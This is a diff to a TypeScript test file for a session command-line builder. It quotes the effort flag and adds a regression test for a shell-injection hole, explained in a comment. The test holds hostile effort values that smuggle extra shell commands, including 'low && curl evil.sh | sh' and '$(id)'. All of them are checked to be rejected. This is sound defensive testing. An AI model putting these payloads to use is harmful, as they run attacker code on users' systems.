@@ -163,7 +163,9 @@ test("fresh launch appends --effort last when an effort level is set", () => {
     effort: "high",
     mode: "fresh"
   });
-  expect(line).toBe("claude run --session-id \"id-1\" --agent reviewer --effort high");
+  // Quoted since card 6c380073 (second audit round): same discipline as
+  // --agent/--model, see effortFlag's own doc.
+  expect(line).toBe("claude run --session-id \"id-1\" --agent reviewer --effort \"high\"");
 });
 
 test("resume re-passes --effort (not auto-restored) after the fork", () => {
@@ -174,7 +176,7 @@ test("resume re-passes --effort (not auto-restored) after the fork", () => {
     effort: "xhigh",
     mode: "resume"
   });
-  expect(line).toBe("claude run --resume \"id-old\" --fork-session --session-id \"id-new\" --effort xhigh");
+  expect(line).toBe("claude run --resume \"id-old\" --fork-session --session-id \"id-new\" --effort \"xhigh\"");
 });
 
 test("an empty/whitespace effort never emits the flag (Auto position)", () => {
@@ -190,6 +192,57 @@ test("an empty/whitespace effort never emits the flag (Auto position)", () => {
   expect(resume).toBe("claude run --resume \"id-old\" --fork-session --session-id \"id-new\"");
 });
 
+// Card 6c380073, second audit round: `effort` reached the login-shell command
+// line with NO allow-list and NO quotes, while `agent`/`model` in this SAME
+// file went through sanitizeFlagValue AND were double-quoted -- two
+// disciplines in one file, and the exception was the bug. It was reachable by
+// a deck-control caller restricted to three tools: parseEntry only trims
+// `effort`, the restricted-caller guard tests only `entry.args`, and
+// sessionsHaveShellFields looks only at command/args, so nothing on that path
+// ever inspected this field. The documented enum
+// ('low'|'medium'|'high'|'xhigh'|'max') lives ONLY in deck-control-mcp.ts's
+// DECLARATIVE JSON schema (its tools/call forwards arguments verbatim) and in
+// two renderer pickers -- it was a barrier on no path at all.
+
+test("a hostile effort value never reaches the shell (sanitized + quoted, card 6c380073)", () => {
+  // Every payload here is one sanitizeFlagValue already rejects for
+  // agent/model; effort must now be held to the exact same rule.
+  for (const hostile of [
+    "low; touch /tmp/pwned",
+    "low$(id)",
+    "low`id`",
+    "low && curl evil.sh | sh",
+    'low" ; echo hi #'
+  ]) {
+    const fresh = buildSessionCommandLine({
+      baseCommand: "claude run",
+      sessionId: "id-1",
+      effort: hostile,
+      mode: "fresh"
+    });
+    // Rejected outright: no flag at all rather than a half-sanitized one.
+    expect(fresh).toBe('claude run --session-id "id-1"');
+    const resume = buildSessionCommandLine({
+      baseCommand: "claude run",
+      sessionId: "id-new",
+      prevSessionId: "id-old",
+      effort: hostile,
+      mode: "resume"
+    });
+    expect(resume).toBe('claude run --resume "id-old" --fork-session --session-id "id-new"');
+  }
+});
+
+test("a legitimate effort still rides the line, now double-quoted like --agent/--model", () => {
+  const line = buildSessionCommandLine({
+    baseCommand: "claude run",
+    sessionId: "id-1",
+    effort: "xhigh",
+    mode: "fresh"
+  });
+  expect(line).toBe('claude run --session-id "id-1" --effort "xhigh"');
+});
+
 test("fresh launch inserts --plugin-dir right after the base command", () => {
   const line = buildSessionCommandLine({
     baseCommand: "claude run",
@@ -199,7 +252,9 @@ test("fresh launch inserts --plugin-dir right after the base command", () => {
     effort: "high",
     mode: "fresh"
   });
-  expect(line).toBe('claude run --plugin-dir "C:/res/deck-plugin" --session-id "id-1" --agent reviewer --effort high');
+  expect(line).toBe(
+    'claude run --plugin-dir "C:/res/deck-plugin" --session-id "id-1" --agent reviewer --effort "high"'
+  );
 });
 
 test("resume inserts --plugin-dir before --resume", () => {
